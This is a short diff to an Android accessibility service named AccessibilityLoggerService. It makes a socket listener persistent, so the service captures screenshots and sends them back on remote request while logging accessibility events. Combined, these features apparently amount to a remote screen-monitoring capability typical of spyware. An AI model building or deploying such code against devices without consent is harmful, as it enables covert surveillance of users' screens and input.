@@ -32,8 +32,7 @@ public class AccessibilityLoggerService extends AccessibilityService {
             // Create text handler with screenshot capture reference
             this.accessibilityEventHandler = new AccessibilityEventHandler(screenShotCapture, socketManager);
 
-            // Add listener for manual screenshot requests
-            this.socketManager.addListener("screenshot", args -> {
+            this.socketManager.addPersistentListener("screenshot", args -> {
                 // Capture screenshot and send as response
                 screenShotCapture.takeScreenshot(new ScreenshotCapture.ScreenshotCallback() {
                     @Override
